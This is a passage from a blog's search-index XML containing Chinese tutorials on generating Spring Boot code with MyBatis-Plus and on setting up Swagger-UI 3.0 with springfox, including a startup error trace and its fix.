<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>springboot使用MyBatis-Plus代码生成器</title>
      <link href="2022/08/29/SpringBoot%E6%95%B4%E5%90%88MyBatis-Plus%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/"/>
      <url>2022/08/29/SpringBoot%E6%95%B4%E5%90%88MyBatis-Plus%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="springboot使用MyBatis-Plus代码生成器"><a href="#springboot使用MyBatis-Plus代码生成器" class="headerlink" title="springboot使用MyBatis-Plus代码生成器"></a>springboot使用MyBatis-Plus代码生成器</h2><h3 id="1、添加依赖"><a href="#1、添加依赖" class="headerlink" title="1、添加依赖"></a>1、添加依赖</h3><p>在pom.xml文件中添加如下依赖：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mybatis-plus代码生成器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-generator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>        </span><br><span class="line"><span class="comment">&lt;!--velocity模板引擎--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.velocity<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>velocity<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意：当前包未传递依赖 mybatis-plus 包，需要自己引入！</p><h3 id="2、简单配置使用"><a href="#2、简单配置使用" class="headerlink" title="2、简单配置使用"></a>2、简单配置使用</h3><p>新建一个CodeGenerator类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.FastAutoGenerator;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.config.OutputFile;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MyBatis-Plus代码生成器</span></span><br><span class="line"><span class="comment"> * by QianCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2022-08-28</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CodeGenerator</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        generate();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">generate</span><span class="params">()</span></span>&#123;</span><br><span class="line">        FastAutoGenerator.create(<span class="string">&quot;jdbc:mysql://localhost:3306/vue_springboot_test?useUnicode=true&amp;characterEncoding=UTF-8&amp;serverTimezone=Asia/Shanghai&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;zzh1998&quot;</span>)</span><br><span class="line">                .globalConfig(builder -&gt; &#123;</span><br><span class="line">                    builder.author(<span class="string">&quot;QianCheng&quot;</span>) <span class="comment">// 设置作者</span></span><br><span class="line">                            .enableSwagger() <span class="comment">// 开启 swagger 模式</span></span><br><span class="line">                            .fileOverride() <span class="comment">// 覆盖已生成文件</span></span><br><span class="line">                            .outputDir(<span class="string">&quot;G:\\Vue+SpringBoot练手项目\\Vue_SpringBoot_Project\\springboot\\src\\main\\java\\&quot;</span>); <span class="comment">// 指定输出目录</span></span><br><span class="line">                &#125;)</span><br><span class="line">                .packageConfig(builder -&gt; &#123;</span><br><span class="line">                    builder.parent(<span class="string">&quot;com.qiancheng.springboot&quot;</span>) <span class="comment">// 设置父包名</span></span><br><span class="line">                            .moduleName(<span class="keyword">null</span>) <span class="comment">// 设置父包模块名</span></span><br><span class="line">                            .pathInfo(Collections.singletonMap(OutputFile.mapperXml, <span class="string">&quot;G:\\Vue+SpringBoot练手项目\\Vue_SpringBoot_Project\\springboot\\src\\main\\resources\\mapper\\&quot;</span>)); <span class="comment">// 设置mapperXml生成路径</span></span><br><span class="line">                &#125;)</span><br><span class="line">                .strategyConfig(builder -&gt; &#123;</span><br><span class="line">                    builder.entityBuilder().enableLombok();<span class="comment">//开启Lombok模型</span></span><br><span class="line"><span class="comment">//                    builder.mapperBuilder().enableMapperAnnotation().build();//为mapper接口添加@Mapper注解</span></span><br><span class="line">                    builder.controllerBuilder().enableHyphenStyle()  <span class="comment">// 开启驼峰转连字符</span></span><br><span class="line">                            .enableRestStyle();  <span class="comment">// 开启生成@RestController 控制器</span></span><br><span class="line">                    builder.addInclude(<span class="string">&quot;sys_user&quot;</span>) <span class="comment">// 设置需要生成的表名</span></span><br><span class="line">                            .addTablePrefix(<span class="string">&quot;t_&quot;</span>, <span class="string">&quot;sys_&quot;</span>); <span class="comment">// 设置过滤表前缀</span></span><br><span class="line">                &#125;)</span><br><span class="line"><span class="comment">//                .templateEngine(new FreemarkerTemplateEngine()) // 使用Freemarker引擎模板，默认的是Velocity引擎模板</span></span><br><span class="line"></span><br><span class="line">                .execute();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置好后运行main函数便可以自动生成模板代码。更多配置请查看<a href="https://baomidou.com/pages/779a6e/#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">MyBatis-Plus官网</a></p><h3 id="3、自定义模板生成代码"><a href="#3、自定义模板生成代码" class="headerlink" title="3、自定义模板生成代码"></a>3、自定义模板生成代码</h3><ol><li><p>在resources目录下新建templates文件夹。</p></li><li><p>在Libraries下找到导入的Mevan: com.baomidou:mybatis-plus-generator:3.5.1这个包。将这个包下的templates文件夹里的模板样式文件复制到自己新建的templates文件夹里。</p></li><li><p>并修改自定义为自己想要的模板。例如自定义controller模板，修改templates/controller.java.vm文件：</p> <figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> $&#123;<span class="keyword">package</span>.Controller&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> $!&#123;<span class="keyword">package</span>.Service&#125;.$&#123;table.serviceName&#125;;</span><br><span class="line"><span class="keyword">import</span> $&#123;<span class="keyword">package</span>.Entity&#125;.$&#123;entity&#125;;</span><br><span class="line"></span><br><span class="line">#if($&#123;restControllerStyle&#125;)</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line">#else</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line">#end</span><br><span class="line">#if($&#123;superControllerClassPackage&#125;)</span><br><span class="line"><span class="keyword">import</span> $&#123;superControllerClassPackage&#125;;</span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * $!&#123;table.comment&#125; 前端控制器</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> $&#123;author&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> $&#123;date&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">#if($&#123;restControllerStyle&#125;)</span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line">#else</span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line">#end</span><br><span class="line"><span class="meta">@RequestMapping(&quot;#if($&#123;package.ModuleName&#125;)/$&#123;package.ModuleName&#125;#end/#if($&#123;controllerMappingHyphenStyle&#125;)$&#123;controllerMappingHyphen&#125;#else$&#123;table.entityPath&#125;#end&quot;)</span></span><br><span class="line">#if($&#123;kotlin&#125;)</span><br><span class="line">class $&#123;table.controllerName&#125;#if($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end</span><br><span class="line"></span><br><span class="line">#else</span><br><span class="line">#if($&#123;superControllerClass&#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> $</span>&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123;</span><br><span class="line">#else</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> $</span>&#123;table.controllerName&#125; &#123;</span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/save&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">save</span><span class="params">(<span class="meta">@RequestBody</span> $&#123;entity&#125; $&#123;table.entityPath&#125;)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DeleteMapping(&quot;/delete/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">delete</span><span class="params">(<span class="meta">@PathVariable</span> Integer id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $&#123;table.entityPath&#125;Service.removeById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;$&#123;entity&#125;&gt; findAll() &#123;</span><br><span class="line">        <span class="keyword">return</span> $&#123;table.entityPath&#125;Service.list();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> $&#123;entity&#125; findOne(<span class="meta">@PathVariable</span> Integer id) &#123;</span><br><span class="line">        <span class="keyword">return</span> $&#123;table.entityPath&#125;Service.getById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DeleteMapping(&quot;/deleteBatch&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">deleteBatch</span><span class="params">(<span class="meta">@RequestBody</span> List&lt;Integer&gt; ids)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $&#123;table.entityPath&#125;Service.removeBatchByIds(ids);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Page&lt;$&#123;entity&#125;&gt; findPage(<span class="meta">@RequestParam</span> Integer pageNum,</span><br><span class="line">                                    <span class="meta">@RequestParam</span> Integer pageSize) &#123;</span><br><span class="line">        QueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">        queryWrapper.orderByDesc(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> $&#123;table.entityPath&#125;Service.page(<span class="keyword">new</span> Page&lt;&gt;(pageNum, pageSize),queryWrapper);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#end</span><br></pre></td></tr></table></figure></li><li><p>配置好后运行代码生成器便可以自动生成模板代码。更多配置请查看<a href="https://baomidou.com/pages/779a6e/#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">MyBatis-Plus官网</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> SpringBoot </category>
          
          <category> 整合MyBatis-Plus </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
            <tag> MyBatis-Plus </tag>
            
            <tag> 代码生成器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springboot整合Swagger-UI 3.0</title>
      <link href="2022/08/25/SpringBoot%E6%95%B4%E5%90%88Swagger-UI/"/>
      <url>2022/08/25/SpringBoot%E6%95%B4%E5%90%88Swagger-UI/</url>
      
        <content type="html"><![CDATA[<h2 id="一、swagger简介"><a href="#一、swagger简介" class="headerlink" title="一、swagger简介"></a>一、swagger简介</h2><h3 id="1-什么是swagger"><a href="#1-什么是swagger" class="headerlink" title="1.什么是swagger"></a>1.什么是swagger</h3><p><a href="https://swagger.io/">Swagger</a>是一个规范和完整的框架，用于生成、描述、调用和可视化RESTful风格的Web服务（2015年，Swagger项目被SmartBear Software收购。Swagger 规范被捐赠给 Linux 基金会并更名为 OpenAPI）。简单来说，Swagger是一个功能强大的接口管理工具，帮你设计接口API，生成接口API的文档，甚至可以对接口API进行测试，并且提供了多种编程语言的前后端分离解决方案。</p><p>Swagger有大致有3个优点：</p><ol><li>Swagger可以整合到代码中，在开发时通过注解，编写注释，自动生成API文档。</li><li>将前端后台分开，不会有过分的依赖。</li><li>界面清晰，无论是editor的实时展示还是ui的展示都十分人性化，如果自己仅仅用markdown来编写，又要纠结该如何展现，十分痛苦。</li></ol><h3 id="2-swagger注解"><a href="#2-swagger注解" class="headerlink" title="2.swagger注解"></a>2.swagger注解</h3><p>swagger通过注解表明该接口会生成文档，包括接口名、请求方法、参数、返回信息的等等。</p><p>@Api：修饰整个类，描述Controller的作用 </p><p>@ApiOperation：描述一个类的一个方法，或者说一个接口 </p><p>@ApiParam：单个参数描述 </p><p>@ApiModel：用对象来接收参数 </p><p>@ApiProperty：用对象接收参数时，描述对象的一个字段 </p><p>@ApiResponse：HTTP响应其中1个描述 </p><p>@ApiResponses：HTTP响应整体描述 </p><p>@ApiIgnore：使用该注解忽略这个API </p><p>@ApiError ：发生错误返回的信息 </p><p>@ApiImplicitParam：一个请求参数 </p><p>@ApiImplicitParams：多个请求参数</p><h2 id="二、springboot整合Swagger-UI-3-0"><a href="#二、springboot整合Swagger-UI-3-0" class="headerlink" title="二、springboot整合Swagger-UI 3.0"></a>二、springboot整合Swagger-UI 3.0</h2><h3 id="1、添加依赖"><a href="#1、添加依赖" class="headerlink" title="1、添加依赖"></a>1、添加依赖</h3><p>pom.xml中添加：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- swagger --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.springfox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springfox-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>备注：</p><ol><li><p>什么是springfox?</p><p> springfox就是对swagger规范在spring下的封装实现，我们看得到的界面就是springfox-swagger-ui</p><p> Springfox官方文档：<a href="http://springfox.github.io/springfox/docs/snapshot/">http://springfox.github.io/springfox/docs/snapshot/</a></p><p> Springfox的GitHub仓库：<a href="https://github.com/springfox/springfox">https://github.com/springfox/springfox</a></p><p> Springfox3.0版本特性：<a href="https://github.com/springfox/springfox/releases/tag/3.0.0">https://github.com/springfox/springfox/releases/tag/3.0.0</a></p></li></ol><h3 id="2、配置Swagger-UI"><a href="#2、配置Swagger-UI" class="headerlink" title="2、配置Swagger-UI"></a>2、配置Swagger-UI</h3><ol><li><p>新建SwaggerConfig类，并在SwaggerConfig.java文件中进行配置：</p>   <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.builders.ApiInfoBuilder;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.builders.PathSelectors;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.builders.RequestHandlerSelectors;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.oas.annotations.EnableOpenApi;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.service.ApiInfo;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.service.Contact;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.spi.DocumentationType;</span><br><span class="line"><span class="keyword">import</span> springfox.documentation.spring.web.plugins.Docket;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Swagger-ui配置</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableOpenApi</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SwaggerConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建API应用</span></span><br><span class="line"><span class="comment">     * apiInfo() 增加API相关信息</span></span><br><span class="line"><span class="comment">     * 通过select()函数返回一个ApiSelectorBuilder实例,用来控制哪些接口暴露给Swagger来展现，</span></span><br><span class="line"><span class="comment">     * 本例采用指定扫描的包路径来定义指定要建立API的目录。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Docket <span class="title">restApi</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Docket(DocumentationType.SWAGGER_2)</span><br><span class="line">                .groupName(<span class="string">&quot;标准接口&quot;</span>)</span><br><span class="line">                .apiInfo(apiInfo(<span class="string">&quot;Spring Boot中使用Swagger3构建RESTful APIs&quot;</span>, <span class="string">&quot;1.0&quot;</span>))</span><br><span class="line">                .useDefaultResponseMessages(<span class="keyword">true</span>)</span><br><span class="line">                .forCodeGeneration(<span class="keyword">false</span>)</span><br><span class="line">                .select()</span><br><span class="line">                .apis(RequestHandlerSelectors.basePackage(<span class="string">&quot;com.qiancheng.springboot.controller&quot;</span>))</span><br><span class="line">                .paths(PathSelectors.any())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建该API的基本信息（这些基本信息会展现在文档页面中）</span></span><br><span class="line"><span class="comment">     * 访问地址：http://ip:port/swagger-ui/index.html</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ApiInfo <span class="title">apiInfo</span><span class="params">(String title, String version)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ApiInfoBuilder()</span><br><span class="line">                .title(title)<span class="comment">//标题</span></span><br><span class="line">                .description(<span class="string">&quot;更多请关注: https://qianchenggit.github.io/&quot;</span>)<span class="comment">//描述</span></span><br><span class="line">                .termsOfServiceUrl(<span class="string">&quot;https://qianchenggit.github.io/&quot;</span>)<span class="comment">//服务条款URL</span></span><br><span class="line">                .contact(<span class="keyword">new</span> Contact(<span class="string">&quot;qiancheng&quot;</span>, <span class="string">&quot;https://qianchenggit.github.io/&quot;</span>, <span class="string">&quot;zehong.zhang@qq.com&quot;</span>))</span><br><span class="line">                .version(version)<span class="comment">//版本</span></span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>运行程序，如果报以下错误：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Error starting ApplicationContext. To display the conditions report re-run your application with &#x27;debug&#x27; enabled.</span><br><span class="line">2022-08-24 21:42:28.564 ERROR 8600 --- [           main] o.s.boot.SpringApplication               : Application run failed</span><br><span class="line"></span><br><span class="line">org.springframework.context.ApplicationContextException: Failed to start bean &#x27;documentationPluginsBootstrapper&#x27;; nested exception is java.lang.NullPointerException</span><br><span class="line">at org.springframework.context.support.DefaultLifecycleProcessor.doStart(DefaultLifecycleProcessor.java:181) ~[spring-context-5.3.22.jar:5.3.22]</span><br><span class="line">at org.springframework.context.support.DefaultLifecycleProcessor.access$200(DefaultLifecycleProcessor.java:54) ~[spring-context-5.3.22.jar:5.3.22]</span><br><span class="line">at org.springframework.context.support.DefaultLifecycleProcessor$LifecycleGroup.start(DefaultLifecycleProcessor.java:356) ~[spring-context-5.3.22.jar:5.3.22]</span><br><span class="line">at java.lang.Iterable.forEach(Iterable.java:75) ~[na:1.8.0_191]</span><br><span class="line">at org.springframework.context.support.DefaultLifecycleProcessor.startBeans(DefaultLifecycleProcessor.java:155) ~[spring-context-5.3.22.jar:5.3.22]</span><br><span class="line">at org.springframework.context.support.DefaultLifecycleProcessor.onRefresh(DefaultLifecycleProcessor.java:123) ~[spring-context-5.3.22.jar:5.3.22]</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.finishRefresh(AbstractApplicationContext.java:935) ~[spring-context-5.3.22.jar:5.3.22]</span><br><span class="line">at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:586) ~[spring-context-5.3.22.jar:5.3.22]</span><br><span class="line">at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:147) ~[spring-boot-2.7.3.jar:2.7.3]</span><br><span class="line">at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:734) [spring-boot-2.7.3.jar:2.7.3]</span><br><span class="line">at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:408) [spring-boot-2.7.3.jar:2.7.3]</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:308) [spring-boot-2.7.3.jar:2.7.3]</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:1306) [spring-boot-2.7.3.jar:2.7.3]</span><br><span class="line">at org.springframework.boot.SpringApplication.run(SpringApplication.java:1295) [spring-boot-2.7.3.jar:2.7.3]</span><br><span class="line">at com.qiancheng.springboot.SpringbootApplication.main(SpringbootApplication.java:12) [classes/:na]</span><br><span class="line">Caused by: java.lang.NullPointerException: null</span><br><span class="line">at springfox.documentation.spring.web.WebMvcPatternsRequestConditionWrapper.getPatterns(WebMvcPatternsRequestConditionWrapper.java:56) ~[springfox-spring-webmvc-3.0.0.jar:3.0.0]</span><br><span class="line">at springfox.documentation.RequestHandler.sortedPaths(RequestHandler.java:113) ~[springfox-core-3.0.0.jar:3.0.0]</span><br><span class="line">at springfox.documentation.spi.service.contexts.Orderings.lambda$byPatternsCondition$3(Orderings.java:89) ~[springfox-spi-3.0.0.jar:3.0.0]</span><br><span class="line">at java.util.Comparator.lambda$comparing$77a9974f$1(Comparator.java:469) ~[na:1.8.0_191]</span><br><span class="line">at java.util.TimSort.countRunAndMakeAscending(TimSort.java:355) ~[na:1.8.0_191]</span><br><span class="line">at java.util.TimSort.sort(TimSort.java:220) ~[na:1.8.0_191]</span><br><span class="line">at java.util.Arrays.sort(Arrays.java:1512) ~[na:1.8.0_191]</span><br><span class="line">at java.util.ArrayList.sort(ArrayList.java:1462) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.SortedOps$RefSortingSink.end(SortedOps.java:387) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.Sink$ChainedReference.end(Sink.java:258) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.Sink$ChainedReference.end(Sink.java:258) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.Sink$ChainedReference.end(Sink.java:258) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.Sink$ChainedReference.end(Sink.java:258) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:482) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:708) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:499) ~[na:1.8.0_191]</span><br><span class="line">at springfox.documentation.spring.web.plugins.WebMvcRequestHandlerProvider.requestHandlers(WebMvcRequestHandlerProvider.java:81) ~[springfox-spring-webmvc-3.0.0.jar:3.0.0]</span><br><span class="line">at java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:193) ~[na:1.8.0_191]</span><br><span class="line">at java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1382) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:481) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:471) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:708) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234) ~[na:1.8.0_191]</span><br><span class="line">at java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:499) ~[na:1.8.0_191]</span><br><span class="line">at springfox.documentation.spring.web.plugins.AbstractDocumentationPluginsBootstrapper.withDefaults(AbstractDocumentationPluginsBootstrapper.java:107) ~[springfox-spring-web-3.0.0.jar:3.0.0]</span><br><span class="line">at springfox.documentation.spring.web.plugins.AbstractDocumentationPluginsBootstrapper.buildContext(AbstractDocumentationPluginsBootstrapper.java:91) ~[springfox-spring-web-3.0.0.jar:3.0.0]</span><br><span class="line">at springfox.documentation.spring.web.plugins.AbstractDocumentationPluginsBootstrapper.bootstrapDocumentationPlugins(AbstractDocumentationPluginsBootstrapper.java:82) ~[springfox-spring-web-3.0.0.jar:3.0.0]</span><br><span class="line">at springfox.documentation.spring.web.plugins.DocumentationPluginsBootstrapper.start(DocumentationPluginsBootstrapper.java:100) ~[springfox-spring-web-3.0.0.jar:3.0.0]</span><br><span class="line">at org.springframework.context.support.DefaultLifecycleProcessor.doStart(DefaultLifecycleProcessor.java:178) ~[spring-context-5.3.22.jar:5.3.22]</span><br><span class="line">... 14 common frames omitted</span><br><span class="line"></span><br><span class="line">Process finished with exit code 1</span><br></pre></td></tr></table></figure></li></ol><p>   ​    原因是：SpringFox正在使用 WebMvc 但尚未使用<a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/web/servlet/config/annotation/EnableWebMvc.html"><code>@EnableWebMvc</code></a>注解，请在SpringbootApplication启动类增加@EnableWebMvc注解：<br>   <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.EnableWebMvc;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringbootApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(SpringbootApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><ol><li>运行程序，访问：<a href="">http://{ip}:{port}/swagger-ui/index.html</a></li></ol><h2 id="三、使用第三方UI（knife4j）"><a href="#三、使用第三方UI（knife4j）" class="headerlink" 